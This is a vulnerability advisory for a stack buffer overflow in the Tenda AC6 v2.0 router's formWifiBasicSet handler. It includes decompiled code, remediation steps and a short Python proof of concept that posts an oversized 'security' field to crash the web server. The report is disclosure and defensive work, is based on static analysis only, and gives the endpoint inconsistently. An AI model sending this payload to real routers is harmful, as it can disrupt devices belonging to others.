# Tenda AC6 v2.0 V15.03.06.51 was discovered to contain a stack buffer overflow in formWifiBasicSet

## Overview

- Vendor: Tenda
- Product: AC6 v2.0
- Version: V15.03.06.51
- Component: formWifiBasicSet handler
- Vulnerability Class: CWE-121 stack buffer overflow
- Manufacturer: https://www.tendacn.com/

## Affected version

- Product: Tenda AC6 v2.0
- Firmware: V15.03.06.51 (newer than the public AC6 V1.0 V15.03.05.16 report)
- Package: `US_AC6V2.0RTL_V15.03.06.51_multi_TDE01.zip`.
- `bin/httpd`:.
- Architecture: MIPS little-endian, uClibc; binary includes debug symbols.

## Vulnerability details

`formWifiBasicSet` reads the POST parameter `security` and copies it into a
256-byte stack buffer with `strcpy`; the same pattern exists for
`security_5g` and `param_5g`:

```c
char param[256];       // [sp+88h]
char param_5g[256];    // [sp+188h]
...
security = websGetVar(wp, "security", "none");
security_5g = websGetVar(wp, "security_5g", "none");
...
strcpy(param, security);
...
strcpy(param_5g, security_5g);
```

There is no `strlen`/`strlcpy`/allow-list check between `websGetVar` and the
copies. A `security` value longer than 256 bytes overwrites adjacent stack
variables (`param_5g`, `wpapsk_type`, ...) and the saved frame. This is the
same class as the public AC6 V1.0 V15.03.05.16 report
(`/goform/WifiBasicSet` `security`), but the local V15.03.06.51 build still
contains the unchecked copy.

The handler requires an authenticated admin session. Tenda's GoAhead-based
`httpd` has no per-request CSRF token in this handler, so admin-CSRF is
plausible; the static analysis cannot confirm CSRF without a browser test.

## PoC

```python
import requests

url = "http://<router>/goform/WifiBasicSet"
payload = "A" * 500
data = {
    "security_5g": "1",
    "hideSsid": "1",
    "ssid": "1",
    "security": payload,
    "wrlPwd": "1",
    "hideSsid_5g": "1",
    "ssid_5g": "1",
    "wrlPwd_5g": "1",
}
r = requests.post(url, data=data, timeout=5)
print(r.status_code, r.text[:200])
```

## Reproduction and terminal evidence

Static evidence only at this stage. The handler and buffer layout are from the
unmodified `bin/httpd`; no dynamic rehost of this AC6 v2.0 image has been
completed. A FirmAE/qemu-user run should show a Boa/httpd crash or connection
reset with 500 bytes and normal behavior with a short value.

Decompiler transcript (IDA 9.1, MIPS):

```
char param[256];       // [sp+88h] BYREF
char param_5g[256];    // [sp+188h] BYREF
security = websGetVar(wp, "security", "none");
security_5g = websGetVar(wp, "security_5g", "none");
strcpy(param, security);
strcpy(param_5g, security_5g);
```


## Impact

Authenticated admin (or CSRF) stack corruption / denial of service; control
flow hijack is plausible but was not demonstrated. The 256-byte buffer and
lack of canary/stack-protector need to be checked in the target build.

## Remediation

- Replace `strcpy` with `strlcpy(param, security, sizeof(param))` and reject
  values longer than the intended maximum.
- Add CSRF tokens to configuration handlers.
- Compile with stack protector and test the boundary.

## Known CVE relation

**CVE candidate type: new affected version (AC6 v2.0 V15.03.06.51) of the public AC6 V1.0 security overflow — candidate new CVE.**

- The public AC6 V1.0 V15.03.05.16 `/goform/WifiBasicSet` `security` overflow
  is the same class. This report documents a newer AC6 v2.0 build
  (V15.03.06.51) that still contains the unchecked copy. Vendor/CNA should
  confirm whether the existing CVE covers this version; if not, it is a new
  affected version.

## Status and disclosure

Static confirmation (decompilation; handler unchanged). Dynamic pending.
Candidate new CVE — new affected version (AC6 v2.0 V15.03.06.51) of the public AC6 V1.0 security overflow; CVE application in progress.

## Additional Information

```markdown
### Vendor
Tenda

### Product
AC6 v2.0

### Version or Commit
V15.03.06.51

### Vulnerability Class
CWE-121 stack buffer overflow

### CVE_candidate_type
new affected version (AC6 v2.0 V15.03.06.51) of the public AC6 V1.0 security overflow — candidate new CVE

### CVE_status
CVE application in progress

### Description
formWifiBasicSet reads the security POST parameter and strcpy's it into a 256-byte stack buffer; security_5g and param_5g follow the same pattern.

### Affected_component
formWifiBasicSet handler

### Attack_vector
Authenticated POST to /goform/formWifiBasicSet with a long security value.

### Product_version
AC6 v2.0 V15.03.06.51

### Reference
- https://www.tendacn.com/
- https://github.com/vuln-1/vuln/blob/main/Tenda/AC6v2_V15.03.06.51/report-1.md
```
